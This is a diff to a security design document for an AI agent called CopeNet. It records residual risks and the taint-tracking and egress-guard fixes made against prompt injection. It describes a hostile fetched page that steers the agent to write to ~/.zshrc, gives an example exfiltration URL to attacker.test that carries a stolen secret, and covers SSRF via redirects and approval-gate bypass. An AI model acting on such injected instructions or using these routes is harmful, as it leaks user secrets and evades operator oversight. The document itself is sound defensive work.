@@ -119,32 +119,33 @@ declines.
 
 ## 6. Residual risk (the honest gaps)
 
-Defense-in-depth means naming what still bites:
+Defense-in-depth means naming what still bites. The **Barricade Tier-A pass**
+(2026-06) closed the cross-turn-taint, web.search-egress, approval-scope, and
+egress-contract gaps that a parallel review (Codex) surfaced. What remains:
 
-1. **Taint is not tracked across a turn.** The biggest gap. Today, a turn that
-   *fetched a hostile page* and a turn that *only read trusted local files* have
-   the **same** privilege to call `files.write` / `shell.exec`. If the operator
-   is in full-access and the agent fetches an attacker page that says "now write
-   this to `~/.zshrc`," the only thing standing in the way is the model's
-   judgment and (for high-risk shell) the approval gate. Writes and benign-looking
-   shell commands are **not** currently escalated just because untrusted web
-   content entered the context.
+1. ✅ *Closed:* **cross-turn taint.** Taint now persists across turns within a
+   session (`barricade._SESSION_SECURITY`), so a poisoned page in turn N keeps
+   turn N+1 gated even though the hostile output is replayed into its context.
+   *Residual:* the carry-forward is **in-process** — it's lost on a host restart,
+   yet replayed untrusted content survives a restart. Durable, provenance-based
+   re-derivation is the Tier-B fix (§7.3).
 
-2. **Exfiltration via the network tool.** `web.fetch` takes a URL. A poisoned
-   page could try to get the agent to fetch
-   `http://attacker.test/?leak=<secret it just read>`. The tool is "read-only"
-   with respect to the *local* machine, but an outbound GET with a crafted URL is
-   itself a data-egress channel. No allowlist / no URL-parameter-secret guard yet.
+2. ✅ *Closed:* **exfiltration via the network tools.** Both `web.fetch` and
+   `web.search` are guarded against secret-bearing URLs/queries and canary values
+   read from sensitive files; egress is a hard block. *Residual:* see SSRF below.
 
-3. **SSRF surface.** `web.fetch` will fetch attacker-chosen URLs, including
-   `http://169.254.169.254/…` (cloud metadata) or `http://localhost:<port>/…`
-   (local services). On the current single-user Mac mini this is low-impact, but
-   it's a real class if CopeNet ever runs server-side.
+3. **SSRF — syntactic host only.** The guard checks the literal hostname/IP, not
+   the **resolved** IP, and does not re-validate **redirects**. A public-looking
+   attacker domain that resolves to private space, or a public URL that 30x-redirects
+   to `169.254.169.254`/loopback after the pre-dispatch check, would slip through.
+   Low-impact on a single-user Mac mini; real if CopeNet runs server-side. Fix:
+   resolve+check the IP and pin/inspect redirects.
 
-4. **Approval fatigue / scope creep.** The approval list is pattern-based. A
-   creative command that achieves a risky effect without matching a pattern
-   (e.g. a Python one-liner that does what `curl` does) can slip the gate. Pattern
-   matching is a backstop, not a boundary.
+4. **Approval fatigue / scope creep.** The high-risk shell gate is pattern-based;
+   a creative command achieving a risky effect without matching a pattern (e.g. a
+   Python one-liner that does what `curl` does) can slip it. Pattern matching is a
+   backstop, not a boundary. (The Barricade taint gate covers the *tainted* case;
+   this is about the untainted full-access case.)
 
 5. **The model is still the soft layer.** Everything in §5 assumes the hard layer
    catches the dangerous *actions*. Low-privilege manipulation (steering the
@@ -161,20 +162,24 @@ Defense-in-depth means naming what still bites:
 > opt-in today and should graduate to default-on after broader soak.
 
 1. ✅ **Taint-tracking on side effects** *(the headline fix for gap #1)*. When a
-   run ingests untrusted external content (`web.search` / `web.fetch`), an
-   `untrusted_context` flag is set on the run's `RunSecurityState`. While set,
-   side-effectful tools (`files.write` / `files.edit` / `shell.exec` /
-   `artifact.create`) return `approval_required` instead of executing — **even in
-   full-access mode** — until the operator approves that exact action. Untrusted-in
-   raises the bar for dangerous-out. *(Gated pre-dispatch in `ToolRegistry.execute`
-   so the side effect never happens; verified by `tests/unit/test_barricade.py`.)*
+   run ingests untrusted external content (`web.search` / `web.fetch`), the
+   **session** is marked tainted. While tainted, state-changing tools return
+   `approval_required` instead of executing — **even in full-access mode** — until
+   the operator approves *that exact call*. **Tier-A tightening:** taint persists
+   across turns in a session (not just per-run); the gated-tool set is
+   **descriptor-derived** (`is_gated_side_effect` — covers future MCP/browser/message
+   tools); and approval is bound to a **tool-id + argument digest** so approving one
+   write doesn't bless a different write to the same path. *(Gated pre-dispatch in
+   `ToolRegistry.execute`; `tests/unit/test_barricade.py`.)*
 
-2. ✅ **Egress guard on `web.fetch`** *(gap #2/#3)*. Refuses non-http(s) schemes
-   and private / loopback / link-local / metadata hosts, blocks URLs whose query
-   carries secret-like parameters (`token=`, `api_key=`, …), and — the strong
-   check — blocks any URL that embeds a value previously read from a sensitive
-   file (`.env`, `*secret*`, keys), so a fetched page can't trick the agent into
-   smuggling a canary it just read. *(`barricade._egress_guard`.)*
+2. ✅ **Egress guard on the network tools** *(gap #2)*. Both `web.fetch` **and**
+   `web.search` are guarded: refuse non-http(s) schemes and private/loopback/metadata
+   hosts, block secret-like query params, and — the strong check — block any
+   URL/query that embeds a value previously read from a sensitive file. **Tier-A:**
+   egress is now a **hard block** (`policyDecision: "egress_blocked"`), not an
+   un-clearable `approval_required` that would park the run. Trusted internal hosts
+   use `COPENET_BARRICADE_FETCH_ALLOWLIST`. *(`barricade._egress_guard` /
+   `_search_egress_guard`.)* Remaining: resolved-IP + redirect SSRF (gap #3).
 
 3. **Provenance envelope on tool results** *(reinforces §2)*. Wrap web/file tool
    output fed back to the model in an explicit `<untrusted-data source=...>` frame
